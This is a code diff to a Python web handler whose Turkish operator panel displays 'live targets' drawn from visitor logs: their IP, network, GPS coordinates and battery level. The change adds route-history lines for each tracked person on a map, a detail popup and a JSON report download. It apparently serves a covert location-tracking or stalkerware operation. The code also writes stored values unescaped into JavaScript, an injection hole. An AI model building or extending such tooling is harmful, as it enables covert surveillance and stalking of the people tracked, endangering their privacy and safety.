@@ -1731,7 +1731,6 @@ class SecureDropHandler(BaseHTTPRequestHandler):
                     cursor.execute("SELECT message, log_type, created_at FROM panel_logs ORDER BY id DESC LIMIT 25")
                     all_panel_logs = cursor.fetchall()
                     
-                    # GROUP BY user_id ile her kullanıcı için sadece en güncel konumu çekiyoruz (Ekranı dolduran üst üste binme hatası düzeltildi)
                     cursor.execute("""
                         SELECT v.user_id, v.ip, v.network_info, v.lat, v.lon, v.battery_level, v.created_at 
                         FROM visitor_logs v
@@ -1743,6 +1742,14 @@ class SecureDropHandler(BaseHTTPRequestHandler):
                         ORDER BY v.id DESC LIMIT 30
                     """)
                     v_logs = cursor.fetchall()
+
+                    user_routes = {}
+                    cursor.execute("SELECT user_id, lat, lon, created_at FROM visitor_logs ORDER BY id ASC")
+                    all_v_history = cursor.fetchall()
+                    for h_uid, h_lat, h_lon, h_date in all_v_history:
+                        if h_uid not in user_routes:
+                            user_routes[h_uid] = []
+                        user_routes[h_uid].append([h_lat, h_lon])
 
                     logs_terminal = ""
                     for pl in all_panel_logs:
@@ -1757,31 +1764,51 @@ class SecureDropHandler(BaseHTTPRequestHandler):
                     visitor_markers_js = ""
                     for vl in v_logs:
                         uid, ip, net, vlat, vlon, bat, vdate = vl
+                        route_coords = user_routes.get(uid, [])
+                        
                         visitor_markers_js += f"""
-                        L.marker([{vlat}, {vlon}], {{
+                        const route_{uid} = {route_coords};
+                        if (route_{uid}.length > 1) {{
+                            L.polyline(route_{uid}, {{color: '#38bdf8', weight: 3, opacity: 0.6, dashArray: '4, 4'}}).addTo(takipMap);
+                        }}
+
+                        const marker_{uid} = L.marker([{vlat}, {vlon}], {{
                             icon: L.divIcon({{
-                                html: '<div style="background:#111827; border:2px solid #ef4444; border-radius:50%; width:32px; height:32px; display:flex; align-items:center; justify-content:center; font-size:16px; box-shadow:0 4px 10px rgba(239,68,68,0.5);" title="User ID: {uid} | Pil: {bat}">🫆</div>',
+                                html: '<div style="background:#111827; border:2px solid #ef4444; border-radius:50%; width:32px; height:32px; display:flex; align-items:center; justify-content:center; font-size:16px; box-shadow:0 4px 10px rgba(239,68,68,0.5);" title="User ID: {uid}">🫆</div>',
                                 iconSize: [32, 32],
                                 iconAnchor: [16, 16]
                             }})
-                        }}).addTo(takipMap).bindPopup("<b>🫆 Canlı Hedef (Tekil Güncel Pin)</b><br>User ID: {uid}<br>🔋 Pil / Şarj: <b>{bat}</b><br>🌐 Ağ / Wi-Fi: {net}<br>Zaman: {vdate}");
+                        }}).addTo(takipMap);
+
+                        marker_{uid}.bindPopup("<b>🫆 Canlı Hedef</b><br>User ID: {uid}<br>🔋 Pil: <b>{bat}</b><br>🌐 Ağ: {net}<br>Zaman: {vdate}<br><button onclick='openDetailModal({uid}, \\"{bat}\\", \\"{net}\\", \\"{vdate}\\", \\"{vlat}, {vlon}\\")' style='margin-top:6px; background:#38bdf8; border:none; padding:4px 8px; border-radius:4px; color:#0f172a; font-weight:bold; cursor:pointer;'>📋 Detay & Rapor İndir</button>");
                         """
 
                     content_html = f"""
                     <div class="form-box" style="border: 1px solid #38bdf8;">
-                        <h2 style="color: #38bdf8; margin-top: 0;">🕵️‍♂️ Takip Et & Canlı Wi-Fi / Cihaz & Pil Takibi</h2>
-                        <p style="color: var(--text-muted); font-size: 13px; margin-bottom: 15px;">Her hedef için yalnızca en son güncel konum gösterilir (üst üste binmeler engellendi). Arka planda 5 saniyede bir otomatik yenilenir:</p>
+                        <h2 style="color: #38bdf8; margin-top: 0;">🕵️‍♂️ Takip Et & Canlı Rota / Rapor Paneli</h2>
+                        <p style="color: var(--text-muted); font-size: 13px; margin-bottom: 15px;">Hedeflerin geçmiş rotaları çizgiyle birleştirilir. Sayfa yenilenmeden arka planda canlı güncellenir:</p>
                         
                         <div style="margin-bottom: 12px; display: flex; gap: 10px;">
-                            <input type="text" id="logSearchInput" onkeyup="filterLogTable()" placeholder="🔍 User ID ile hızlıca arat..." style="margin:0; background:var(--input-bg); border:1px solid var(--border-color); padding:10px; border-radius:8px; color:white;">
+                            <input type="text" id="logSearchInput" onkeyup="filterLogTable()" placeholder="🔍 User ID ile hızlıca arat..." style="margin:0; background:var(--input-bg); border:1px solid var(--border-color); padding:10px; border-radius:8px; color:white; width:100%;">
                         </div>
 
                         <div style="background: var(--card-bg-inner); padding: 15px; border-radius: 8px; border: 1px solid var(--border-color); height: 180px; overflow-y: auto; font-family: monospace; font-size: 12px; margin-bottom: 20px;" id="terminalLogBox">
                             {logs_terminal if logs_terminal else "<span style='color:var(--text-muted);'>Henüz yakalanan log bulunmuyor.</span>"}
                         </div>
 
-                        <h3 style="color: #10b981; font-size: 14px; margin-bottom: 8px;">🗺️ Canlı Konum Haritası (Tekil Güncel Pinler)</h3>
-                        <div id="takipMiniMap" style="width: 100%; height: 260px; border-radius: 10px; border: 1px solid var(--border-color); z-index: 1;"></div>
+                        <h3 style="color: #10b981; font-size: 14px; margin-bottom: 8px;">🗺️ Canlı Rota ve Konum Haritası</h3>
+                        <div id="takipMiniMap" style="width: 100%; height: 280px; border-radius: 10px; border: 1px solid var(--border-color); z-index: 1;"></div>
+                    </div>
+
+                    <div id="targetDetailModal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.7); z-index:9999; justify-content:center; align-items:center;">
+                        <div style="background:#1e293b; border:1px solid #38bdf8; padding:20px; border-radius:12px; width:400px; max-width:90%; color:white; box-shadow:0 10px 25px rgba(0,0,0,0.5);">
+                            <h3 style="color:#38bdf8; margin-top:0;">📋 Hedef Cihaz Raporu</h3>
+                            <div id="modalContentBody" style="font-size:14px; line-height:1.6; margin-bottom:15px; color:#cbd5e1;"></div>
+                            <div style="display:flex; gap:10px; justify-content:flex-end;">
+                                <button onclick="downloadTargetReport()" style="background:#10b981; border:none; padding:8px 14px; border-radius:6px; color:white; font-weight:bold; cursor:pointer;">📥 Raporu İndir (JSON)</button>
+                                <button onclick="closeDetailModal()" style="background:#ef4444; border:none; padding:8px 14px; border-radius:6px; color:white; font-weight:bold; cursor:pointer;">Kapat</button>
+                            </div>
+                        </div>
                     </div>
 
                     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
@@ -1791,7 +1818,35 @@ class SecureDropHandler(BaseHTTPRequestHandler):
                         L.tileLayer('https://{{s}}.tile.openstreetmap.org/{{z}}/{{x}}/{{y}}.png', {{ maxZoom: 19 }}).addTo(takipMap);
                         {visitor_markers_js}
 
-                        // Auto-Refresh (Her 5 saniyede bir arka planda sayfayı yenilemeden güncel verileri akıtır)
+                        let activeModalData = null;
+
+                        function openDetailModal(uid, bat, net, date, coords) {{
+                            activeModalData = {{ userId: uid, battery: bat, network: net, lastSeen: date, coordinates: coords }};
+                            document.getElementById('modalContentBody').innerHTML = `
+                                <b>User ID:</b> ${{uid}}<br>
+                                🔋 <b>Pil Durumu:</b> ${{bat}}<br>
+                                🌐 <b>Ağ Türü:</b> ${{net}}<br>
+                                📍 <b>Son Koordinat:</b> ${{coords}}<br>
+                                ⏱️ <b>Son Aktiflik:</b> ${{date}}
+                            `;
+                            document.getElementById('targetDetailModal').style.display = 'flex';
+                        }}
+
+                        function closeDetailModal() {{
+                            document.getElementById('targetDetailModal').style.display = 'none';
+                        }}
+
+                        function downloadTargetReport() {{
+                            if (!activeModalData) return;
+                            const dataStr = "data:text/json;charset=utf-8," + encodeURIComponent(JSON.stringify(activeModalData, null, 4));
+                            const downloadAnchor = document.createElement('a');
+                            downloadAnchor.setAttribute("href", dataStr);
+                            downloadAnchor.setAttribute("download", `hedef_${{activeModalData.userId}}_raporu.json`);
+                            document.body.appendChild(downloadAnchor);
+                            downloadAnchor.click();
+                            downloadAnchor.remove();
+                        }}
+
                         setInterval(() => {{
                             fetch(window.location.href)
                                 .then(res => res.text())
